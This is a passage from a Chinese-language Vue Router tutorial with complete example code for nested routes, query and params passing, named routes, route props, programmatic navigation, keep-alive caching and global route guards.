Vue组件About：我是About的内容，我是About的内容，我是About的内容，我是About的内容\n  </p>\n</template>\n\n<script>\nexport default {\n  name: "About",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n有两个注意点：\n\n * 路由进行切换的时候，上一个组件默认会被销毁（可以手动设置不被销毁），新的组件会生成并渲染到页面中。\n\n * 路由组件的实例上有$route和$router，其中$route是当前组件的对应的路由规则信息，$router就是项目中唯一的一个路由器（与Vuex一样，唯一的一个$store）。\n\n\n# 3.3 嵌套路由和query传参\n\n嵌套路由也叫多级路由，在一个路由组件中还有一层路由，一般最多套五层。\n\n只需要把router/index.js里的某级路由里添加一个children属性，这个children里就是当前路由的子级路由，仍然要给它配置path和component。要注意的是子级路由的path，不要带上/，也不要写上完整路径（不要path: "/父级/子级"，也不要path: "/子级"），因为Vue Router会自动帮你补齐，最终的写法只需要path: "子级"这种形式即可。\n\nroutes: [{\n    path: \'/home\',          // 一级路由\n    component: Home,\n    children: [{            // 二级路由\n        path: \'news\',       // 不要带上`/`，也不要写\'/home/news\'\n        component: News,\n    }, {\n        path: \'message\',    // 不要带上`/`，也不要写\'/home/message\'\n        component: Message,\n    }]\n}, {\n    path: \'/about\',         // 一级路由\n    component: About\n}]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n然后在那个对应路由组件内部使用<router-link>和<router-view>。特别注意，to属性要写上完整的路径，这个Vue Router帮你补不齐，所以最终写法是to="/父级/子级"。\n\n\x3c!-- to写上完整路径 --\x3e\n<router-link active-class to="/home/news" class="list-item">News</router-link>\n\n\n1\n2\n\n\n相关完整代码如下：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\n\nVue.use(Router);\n\nexport default new Router({\n    routes: [{\n        path: \'/home\',       // URL 端\n        component: Home,     // 展示 端\n        children: [{         // 子级路由（当前是二级路由）\n            path: \'news\',    // 不要带上`/`\n            component: News,\n        }, {\n            path: \'message\',\n            component: Message,\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nHome.vue：\n\n<template>\n  <div>\n    <p>\n      Vue组件Home：我是Home的内容，我是Home的内容，我是Home的内容，我是Home的内容\n    </p>\n    <div>\n      <ul class="nav">\n        <li>\n          \x3c!-- <a class="list-group-item active" href="./home-news.html">News</a> --\x3e\n          \x3c!-- 这里唯一要注意的是to里的路径一定要写完整 --\x3e\n          <router-link active-class to="/home/news" class="list-item"\n            >News</router-link\n          >\n        </li>\n        <li>\n          \x3c!-- <a class="list-group-item" href="./home-message.html">Message</a> --\x3e\n          \x3c!-- 这里唯一要注意的是to里的路径一定要写完整 --\x3e\n          <router-link to="/home/message" class="list-item"\n            >Message</router-link\n          >\n        </li>\n      </ul>\n      <div class="content-child">\n        \x3c!-- 展示端 --\x3e\n        <router-view></router-view>\n      </div>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Home",\n};\n<\/script>\n\n<style>\n.nav {\n  display: flex;\n  justify-content: flex-start;\n  padding-left: 0;\n  margin-top: 35px;\n  list-style: none;\n}\n.nav > li {\n  width: 100px;\n}\n.content-child {\n  background-color: darkgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nNews.vue：\n\n<template>\n  <ul>\n    <li>news001</li>\n    <li>news002</li>\n    <li>news003</li>\n  </ul>\n</template>\n\n<script>\nexport default {\n  name: "News",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nMessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message001</a\n        >&nbsp;&nbsp;\n      </li>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message002</a\n        >&nbsp;&nbsp;\n      </li>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message003</a\n        >&nbsp;&nbsp;\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n现在有个需求，点击Message组件里的每条信息，在下面展示对应的id和tittle。可以给Message的每条信息弄个路由跳转<router-link>，只不过路由展示只需要一个组件，我们在路由跳转时进行一个query传参即可，然后在这个新组件展示时使用this.$route.query进行接收参数。\n\n具体是在<router-link>的to属性里的路由链接后追加?xxx=yyy&www=zzz这种传参，另一种比较方便的写法是，使用to的对象形式：\n\n// 写法一\n:to="`/home/message/detail?id=${item.id}&title=${item.title}`"\n// 写法二\n:to="{\n  path: \'/home/message/detail\', // 路由地址\n  query: {                      // query传参，它是个对象，里面一组组key-value\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n需求实现代码如下：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nexport default new Router({\n    routes: [{\n        path: \'/home\',       // URL 端\n        component: Home,     // 展示 端\n        children: [{         // 子级路由（当前是二级路由）\n            path: \'news\',    // 不要带上`/`\n            component: News,\n        }, {\n            path: \'message\',\n            component: Message,\n            children: [{              // 点击每条message信息时在下方展示详情\n                path: \'detail\',       // 子级路由（当前是三级路由）\n                component: Detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nMessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        \x3c!-- 写法一：直接在链接后加上传统的`?xxx=yyy&www=zzz`即可 --\x3e\n        \x3c!-- <router-link\n          :to="`/home/message/detail?id=${item.id}&title=${item.title}`"\n        >{{item.title}}</router-link> --\x3e\n        \x3c!-- 写法二：使用to的对象形式，对象的path就是路由路径，query是个对象，用于存储路径后面的值 --\x3e\n        <router-link\n          :to="{\n            path: \'/home/message/detail\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nDetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用this.$route.query接收路由跳转时的query传参 --\x3e\n    <h2>id：{{ $route.query.id }}</h2>\n    <h2>title：{{ $route.query.title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Detail",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.4 命名路由和params传参\n\n我们回顾上一节to属性的对象写法：\n\n// to属性的对象写法\n:to="{\n  path: \'/home/message/detail\', // 路由地址\n  query: {                      // query传参，它是个对象，里面一组组key-value\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n我们可以使用命名路由来简化层级比较深的路由。其实就是给路由配置规则的时候加上name: xxx，对应在<router-link>的to属性对象形式里可使用name，无需再写一大串的path。\n\n// to属性的对象写法\n:to="{\n  // 使用name的方式简化path的方式\n  name: \'xiangqing\',\n  // path: \'/home/message/detail\',\n  query: {\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n简化后的相关完整代码如下：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nexport default new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        children: [{\n            path: \'news\',\n            component: News,\n        }, {\n            path: \'message\',\n            component: Message,\n            children: [{\n                name: \'xiangqing\',   // 给比较深路由添加name，在<router-link>里的to就会更方便\n                path: \'detail\',\n                component: Detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nMessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        <router-link\n          :to="{\n            // 使用name的方式简化path的方式\n            name: \'xiangqing\',\n            // path: \'/home/message/detail\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nparams传参，首先把路由配置中的path路径进行修改，比如原来的是path: \'detail\'，那现在就需要提前给params参数进行占位，那就是path: \'detail/:id/:title\'。然后在<router-link>的to属性里改成如下两种方式（特别注意第二种方式）：\n\n// to属性的普通写法\n:to="`/home/message/detail/${item.id}/${item.title}`"\n// to属性的对象写法，params传参只能搭配name使用，不能搭配path\n:to="{\n  // 使用name的方式\n  name: \'xiangqing\',\n  // 这里是params传参，那此时to对象里不能使用path，得用name\n  params: {\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n相关完整代码如下：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nexport default new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        children: [{\n            path: \'news\',\n            component: News,\n        }, {\n            path: \'message\',\n            component: Message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail/:id/:title\', // prams传参，提前占位\n                component: Detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nMessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        \x3c!-- 方式一 --\x3e\n        \x3c!-- <router-link :to="`/home/message/detail/${item.id}/${item.title}`">{{\n          item.title\n        }}</router-link> --\x3e\n        \x3c!-- 方式二，特别注意params传参不能和path搭配使用，得使用name --\x3e\n        <router-link\n          :to="{\n            // 使用name的方式\n            name: \'xiangqing\',\n            // 这里是params传参，那此时to对象里不能使用path，得用name\n            params: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nDetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用this.$route.params接收路由跳转时的params传参 --\x3e\n    <h2>id：{{ $route.params.id }}</h2>\n    <h2>title：{{ $route.params.title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Detail",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.5 路由的props传参\n\n我们可以看到Detail组件在使用接收到的参数时，会使用$route.params.id这样一长串的代码。使用计算属性可以简化它，但是我们这节要使用路由的props传参的方式来简化。\n\n在配置路由信息时，在path、component平级处加上props这个新配置，这个新配置的值有三种形式，对象、布尔值和函数。\n\n路由的props传参有三种形式：\n\n{\n  path: \'message\',\n  component: Message,\n  children: [{\n      name: \'xiangqing\',\n      path: \'detail/:id/:title\', // prams传参，提前占位\n      component: Detail,\n      // 第一种，是个对象，该对象中所有key-value的组合最终都会通过props传给Detail组件\n      // props: {a: 900, b: 1000},\n      // 第二种，是个布尔值，布尔值为true时，把路由接收到的所有params参数通过props传给Detail组件\n      // props: true,\n      // 第三种，是个函数，函数返回的对象中所有key-value的组合最终都会通过props传给Detail组件\n      // 函数的形参是route，它是当前路由信息，保存着params和query传参数据\n      props(route) {\n        return {id: route.query.id, title: route.query.title}\n      }\n  }]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我们就使路由的props传参第三种形式来优化前面的例子：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nexport default new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        children: [{\n            path: \'news\',\n            component: News,\n        }, {\n            path: \'message\',\n            component: Message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: Detail,\n                // 使用路由props的函数形式，形参是route路由信息，返回值的key-value会作为Detail的props\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nMessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        <router-link\n          :to="{\n            name: \'xiangqing\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\nDetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 直接使用props参数 --\x3e\n    <h2>id：{{ id }}</h2>\n    <h2>title：{{ title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Detail",\n  // 接收路由props传参\n  props: ["id", "title"],\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 3.6 编程式的导航\n\n在开始学习编程式的导航之前我们看一下浏览器左上角的“前进”和“后退”。这两个按钮依赖一个历史页面存储结构，该结构其实是一个栈数据类型来。在点击“后退”时，会让“指针”挪动到后面一条URL相关的页面；在点击“前进”时，会让“指针”挪动到前面一条URL相关的页面。\n\n在页面点击新链接，浏览器地址栏的URL更新，这个新的URL会被压到栈里（push方式）。<router-link>就是默认使用这种方式（push方式），它其实还有一个replace方式，在点击新链接，浏览器地址栏的URL更新，但会将栈顶当前这条URL替换成新的URL（以前是追加，现在是替换最顶上那条）。\n\n\x3c!-- 比如我们访问的顺序是：# - about - home - news - message - detail，目前在Detail这里，\n由于下面这行代码，导致后退的顺序是detail - message - home - about - # --\x3e\n<router-link to="/home/message" replace></router-link>\n\n\n1\n2\n3\n\n\n我们再来说说编程式的导航，它的作用是不借助<router-link>来实现路由跳转，让路由跳转更加灵活。\n\n那它借助的是什么呢？是$router里的各种方法（方法具体在原型上），比如push手动跳转到目标路由（类似<router-link>的to属性），back往后退一步路由（类似浏览器“后退”），forward往前进一步路由（类似浏览器“前进”），go(value)当value为正数时前进几步路由为负数时后退几步路由。\n\n首先我们在Message组件中，实现点击每条message尾后的<button>就跳转路由。具体要在点击事件回调函数里使用this.$router.push(param)，如果效果要与之前的<router-link>效果一样，那这个param必须与<router-link>的to属性值一样并且是对象形式。\n\n其实还有this.$router.replace(param)，使用新页面信息替换当前页面信息。这里额外说一下，<router-link to="xxx">其实内部是调用了push方法的，只是它是标签的使用形式，push是js编程的使用形式。\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        {{ item.title }}\n        \x3c!-- 我们将router-link换成了button来跳转路由 --\x3e\n        <button @click="showDetailPush(item)">查看详情（push方式）</button>\n        <button @click="showDetailReplace(item)">查看详情（replace方式）</button>\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n  methods: {\n    showDetailPush(item) {\n      // 手动跳转就需要使用之前to的对象形式\n      // push，追加新的页面信息\n      this.$router.push({\n        name: "xiangqing",\n        query: {\n          id: item.id,\n          title: item.title,\n        },\n      });\n    },\n    showDetailReplace(item) {\n      // 手动跳转就需要使用之前to的对象形式\n      // replace，将原来的当前页面信息替换成这里的新页面信息\n      this.$router.replace({\n        name: "xiangqing",\n        query: {\n          id: item.id,\n          title: item.title,\n        },\n      });\n    }\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n我们使用back、forward和go(value)来实现前进和后退路由：\n\nApp.vue：\n\n<template>\n  <div>\n    <div>\n      <button class="backStep" @click="go(-2)">后退2步</button>\n      <button class="back" @click="back">后退</button>\n      <button class="forward" @click="forward">前进</button>\n      <button class="forwardStep" @click="go(2)">前进2步</button>\n    </div>\n    <div class="outer">\n      <div class="link">\n        <router-link to="/home" active-class class="list-item"\n          >Home</router-link\n        >\n        <router-link to="/about" class="list-item">About</router-link>\n      </div>\n      <div class="content">\n        <router-view></router-view>\n      </div>\n    </div>\n  </div>\n</template>\n<script>\nexport default {\n  name: "App",\n  methods: {\n    back() {\n      this.$router.back();\n    },\n    forward() {\n      this.$router.forward();\n    },\n    go(value) {\n      this.$router.go(value);\n    },\n  },\n};\n<\/script>\n<style>\n.back,\n.forward { width: 60px; margin: 10px 10px 20px 10px; }\n.backStep { margin-left: 16%; }\n.outer { display: flex; }\n.link {\n  display: flex; flex-direction: column;\n  margin-left: 16%;\n}\n.content {\n  margin-left: 10px; padding: 20px;\n  background-color: darkgrey;\n}\n.list-item {\n  margin-bottom: 10px; padding: 10px 15px;\n  background-color: #fff; border: 1px solid #ddd;\n}\n.list-item.active,\n.list-item.router-link-exact-active {\n  z-index: 2; color: #fff;\n  background-color: #337ab7;\n  border-color: #337ab7;\n}\na { text-decoration: none; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 3.7 缓存路由组件\n\n我们经常需要在切换页签跳转路由时，能缓存输入组件内的信息，但跳转路由默认是将之前的组件销毁destroy了。要解决这个问题，需要使用<keep-alive>标签将<router-view>进行包裹。\n\n使用<keep-alive>标签包裹之后，这个<router-view>相关的所有组件都将会被缓存，如果只想缓存个别的，就添加include="News"属性。特别注意，News这个名字是组件内部配置对象里的name属性值。include还可以使用v-bind动态绑定，绑定一个数组[\'News\', \'Message\']，让这两个组件被缓存而不被销毁。\n\nHome.vue：\n\n<template>\n  <div>\n    <p>Vue组件Home：我是Home的内容，我是Home的内容，我是Home的内容，我是Home的内容</p>\n    <div>\n      <ul class="nav">\n        <li>\n          <router-link active-class to="/home/news" class="list-item">News</router-link>\n        </li>\n        <li>\n          <router-link to="/home/message" class="list-item">Message</router-link>\n        </li>\n      </ul>\n      \x3c!-- 使用keep-alive标签包裹router-view，让相关组件被缓存，如果设置include，\n      那就只让include里的组件被缓存。include可以是数组，使用v-bind进行动态绑定，让数组里对应的组件进行缓存 --\x3e\n      <keep-alive include="News" class="content-child">\n        <router-view></router-view>\n      </keep-alive>\n    </div>\n  </div>\n</template>\n<script>\nexport default { name: "Home" };\n<\/script>\n\n<style>\n.nav { display: flex; justify-content: flex-start;\n  padding-left: 0; margin-top: 35px; list-style: none;\n}\n.nav > li { width: 100px; }\n.content-child { background-color: darkgray; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nNews.vue：\n\n<template>\n  <ul>\n    \x3c!-- 增加输入组件 --\x3e\n    <li>news001<input /></li>\n    <li>news002<input /></li>\n    <li>news003<input /></li>\n  </ul>\n</template>\n\n<script>\nexport default {\n  name: "News", // 这个属性值会被<keep-alive include="News">使用\n  // 可以在Message组件里也加上这个日志，如果使用<keep-alive include="News">，\n  // 那就只会出现"Message即将被销毁"的日志\n  beforeDestroy() {\n    console.log("News即将被销毁");\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.8 两个新的生命钩子\n\n如果组件被缓存了，也就是使用<keep-alive>标签将<router-view>进行包裹。如果该组件内部持续性的例如定时器，在切换页签时由于该组件没有被销毁，那么就不会走到beforeDestroy里的clearInterval。这样就导致页面性能底，非常耗资源。\n\nNews.vue：\n\n<template>\n  <div>\n    <h1 :style="{ opacity }">我是定时器示例文本</h1>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n<script>\nexport default {\n  name: "News",\n  data() {\n    return {\n      opacity: 1,\n    };\n  },\n  mounted() {\n    this.timer = setInterval(() => {\n      console.log("@");\n      this.opacity -= 0.01;\n      if (this.opacity <= 0) this.opacity = 1;\n    }, 16);\n  },\n  beforeDestroy() {\n    console.log("News即将被销毁");\n    clearInterval(this.timer);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n解决上面这个问题，就需要两个新的生命钩子activated和deactivated，其中activated是组件激活时被调用（之前切换页签，它被缓存了），deactivated是组件失活时被调用（页签从当前组件切出去了）。注意，这是两个生命钩子是路由组件独有的！\n\n<template>\n  <div>\n    <h1 :style="{ opacity }">我是定时器示例文本</h1>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "News",\n  data() {\n    return {\n      opacity: 1,\n    };\n  },\n  // 组件激活时被调用\n  activated() {\n    console.log("News被激活");\n    this.timer = setInterval(() => {\n      console.log("@");\n      this.opacity -= 0.01;\n      if (this.opacity <= 0) this.opacity = 1;\n    }, 16);\n  },\n  // 组件失活时被调用\n  deactivated() {\n    console.log("News失活");\n    clearInterval(this.timer);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.9 路由守卫\n\n路由守卫是在跳转路由的“前后”作出相应的处理（放置守卫）。\n\n基于路由本身来说，分为全局路由守卫和独享路由守卫，它们的区别是，前者是守卫所有路由的切换动作，后者是守卫某个单个路由的切换动作。全局路由守卫还分为前置的和后置的。\n\n# 全局前置路由守卫\n\n全局前置路由守卫，是在所有路由的切换之前作出相应的处理。具体在router.index.js里使用router.beforeEach(func)，其中这个func就是在每次切换之前会被调用（其实初始化时也会调用一次）。全局前置路由守卫常用于设置路由的访问权限的。\n\n我们先看一下func的三个形参，func(to, from, next){}，to是切换到哪个路由，from是切换前的路由；next就比较重要了，在func内部写上next()就可以“放行”这次的拦截，如果不写就会拦截本次切换。我们设置访问权限就是依靠这三个参数。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nconst router = new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: News,\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: Message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: Detail,\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeEach((to, from, next) => {\n    if (to.name === \'xinxi\' || to.name === \'xinwen\') {\n        // 权限\n        const jurisdiction = localStorage.getItem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n如果有些路由要做权限设置，而有些又不需要做权限设置，那怎么办呢？我们可以给路由加上一个自定义的标识。route的meta属性是路由元信息，由于存放自定义的东西。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\nimport News from \'../pages/News\'\nimport Message from \'../pages/Message\'\nimport Detail from \'../pages/Detail\'\n\nVue.use(Router);\n\nconst router = new Router({\n    routes: [{\n        path: \'/home\',\n        component: Home,\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: News,\n            // 使用路由元信息meta来存储自定义的标识isAuth\n            meta: { isAuth: true },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: Message,\n            // 使用路由元信息meta来存储自定义的标识isAuth\n            meta: { isAuth: true },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: Detail,\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeEach((to, from, next) => {\n    // 换成to.meta.isAuth来判断\n    if (to.meta && to.meta.isAuth) {\n        // 权限\n        const jurisdiction = localStorage.getItem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\nexport default 